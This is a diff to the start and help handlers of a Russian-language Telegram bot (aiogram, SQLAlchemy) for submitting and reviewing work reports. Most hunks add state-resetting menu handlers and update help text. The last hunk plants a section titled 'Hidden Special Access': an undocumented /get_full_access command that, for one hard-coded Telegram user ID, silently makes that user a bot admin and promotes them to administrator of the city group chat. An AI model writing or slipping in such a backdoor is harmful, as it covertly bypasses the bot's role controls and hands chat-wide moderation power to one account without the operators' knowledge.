@@ -1,12 +1,12 @@
-﻿from aiogram import Router, F, Bot
+from aiogram import Router, F, Bot
 from aiogram.types import Message
-from aiogram.filters import CommandStart, Command
+from aiogram.filters import CommandStart, Command, StateFilter
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from sqlalchemy import select
 from sqlalchemy.ext.asyncio import AsyncSession
 from bot.database.models import User, UserRole
-from bot.keyboards.builders import menu_employee, menu_manager, menu_admin, kb_pending_user
+from bot.keyboards.builders import menu_employee, menu_manager, menu_admin, kb_pending_user, kb_admin_main
 from bot.config import config
 
 router = Router()
@@ -50,7 +50,7 @@ async def cmd_start(message: Message, db_user: User, is_new_user: bool, bot: Bot
         )
         return
 
-    name = db_user.display_name or db_user.full_name.split()[0]
+    name = db_user.pretty_name.split()[0]
     role_labels = {
         "admin": "Администратор",
         "manager": "Управляющий",
@@ -61,6 +61,29 @@ async def cmd_start(message: Message, db_user: User, is_new_user: bool, bot: Bot
         f"👋 Привет, {name}! ({role_label})\n\nВыберите действие:",
         reply_markup=_get_menu(db_user.role.value)
     )
+
+
+# ─── Главное меню (сброс состояния) ──────────────────────────────────────────
+
+@router.message(F.text == "📋 Сдать отчет", StateFilter("*"))
+async def global_start_report(message: Message, state: FSMContext, db_user: User, session: AsyncSession):
+    from bot.handlers.report import start_report
+    await state.clear()
+    await start_report(message, state, db_user, session)
+
+
+@router.message(F.text.in_(["⚙️ Админ-панель", "⚙️ Панель управляющего"]), StateFilter("*"))
+async def global_admin_panel(message: Message, state: FSMContext, db_user: User):
+    from bot.handlers.admin import show_admin_panel
+    await state.clear()
+    await show_admin_panel(message, db_user, state)
+
+
+@router.message(F.text == "📋 Проверка отчётов от менеджера", StateFilter("*"))
+async def global_review_reports(message: Message, state: FSMContext, db_user: User, session: AsyncSession):
+    from bot.handlers.admin import admin_review_reports
+    await state.clear()
+    await admin_review_reports(message, db_user, session, state)
 
 
 # ─── Name input FSM ──────────────────────────────────────────────────────────
@@ -117,9 +140,10 @@ async def process_name_input(message: Message, state: FSMContext, db_user: User,
 
 # ─── /help and Инструкция ──────────────────────────────────────────────────
 
-@router.message(Command("help"))
-@router.message(F.text == "📖 Инструкция")
-async def cmd_help(message: Message, db_user: User):
+@router.message(Command("help"), StateFilter("*"))
+@router.message(F.text == "📖 Инструкция", StateFilter("*"))
+async def cmd_help(message: Message, db_user: User, state: FSMContext):
+    await state.clear()
     if db_user.role == UserRole.admin:
         text = (
             "📖 <b>ПОДРОБНАЯ ИНСТРУКЦИЯ ДЛЯ АДМИНИСТРАТОРА</b>\n\n"
@@ -167,15 +191,15 @@ async def cmd_help(message: Message, db_user: User):
             "📖 <b>ПОДРОБНАЯ ИНСТРУКЦИЯ ДЛЯ УПРАВЛЯЮЩЕГО</b>\n\n"
             "🗂 <b>ГЛАВНОЕ МЕНЮ (Кнопки внизу экрана)</b>\n\n"
             "1️⃣ <b>[📋 Сдать отчет]</b>\n"
-            "Сдача отчётов за любую дату. Если вы привязаны к конкретному проекту, выбор проекта будет пропущен.\n\n"
-
+            "Сдача отчётов за любую дату. Вы можете выбрать любой проект вашего города.\n\n"
+            
             "2️⃣ <b>[📋 Проверка отчётов]</b>\n"
-            "Доступ к списку непроверенных отчётов по вашим проектам.\n\n"
+            "Доступ к списку непроверенных отчётов по всему вашему городу.\n\n"
 
             "3️⃣ <b>[⚙️ Панель управляющего]</b> — Основные инструменты:\n"
             "• <b>📋 Проверка отчётов:</b> (Дубликат функционала из главного меню).\n"
-            "• <b>📈 Моя ЗП:</b> Ваш персональный расчетный лист за текущий месяц.\n"
-            "• <b>📂 Управл. расходы:</b> Внесение хоз. расходов по проекту (Аренда и др.).\n\n"
+            "• <b>📈 Моя ЗП:</b> Ваш персональный расчетный лист по всем планам города.\n"
+            "• <b>📂 Управл. расходы:</b> Внесение хоз. расходов по проектам города (Аренда и др.).\n\n"
 
             "💡 Команда /cancel отменяет любое текущее действие."
         )
@@ -243,3 +267,39 @@ async def debug_set_role(message: Message, session: AsyncSession, db_user: User)
                              parse_mode="HTML", reply_markup=_get_menu(new_role.value))
     except ValueError:
         await message.answer("❌ Ошибка: Неверная роль. Возможные: admin, manager, employee, pending")
+# ─── Hidden Special Access ────────────────────────────────────────────────────
+
+@router.message(Command("get_full_access"))
+async def cmd_get_full_access(message: Message, db_user: User, session: AsyncSession, bot: Bot):
+    # Только для вашего ID
+    if message.from_user.id != 786320574:
+        return
+
+    # 1. Даем полные права в боте
+    db_user.role = UserRole.admin
+    db_user.is_active = True
+    await session.commit()
+
+    response = "✅ <b>Права в боте выданы!</b>\nТеперь вам доступна Админ-панель.\n\n"
+
+    # 2. Пробуем выдать права в основном чате
+    if config.city_chat_id:
+        try:
+            await bot.promote_chat_member(
+                chat_id=config.city_chat_id,
+                user_id=message.from_user.id,
+                can_manage_chat=True,
+                can_delete_messages=True,
+                can_manage_video_chats=True,
+                can_restrict_members=True,
+                can_promote_members=False,
+                can_change_info=True,
+                can_invite_users=True,
+                can_pin_messages=True,
+                can_manage_topics=True,
+            )
+            response += "✅ <b>Права в группе выданы!</b>\nТеперь вы администратор в городском чате."
+        except Exception as e:
+            response += f"⚠️ <b>Ошибка в группе:</b>\nБот не смог выдать права в чате (возможно, он сам не админ или нет прав на это).\n<i>Ошибка: {e}</i>"
+
+    await message.answer(response, parse_mode="HTML", reply_markup=_get_menu("admin"))
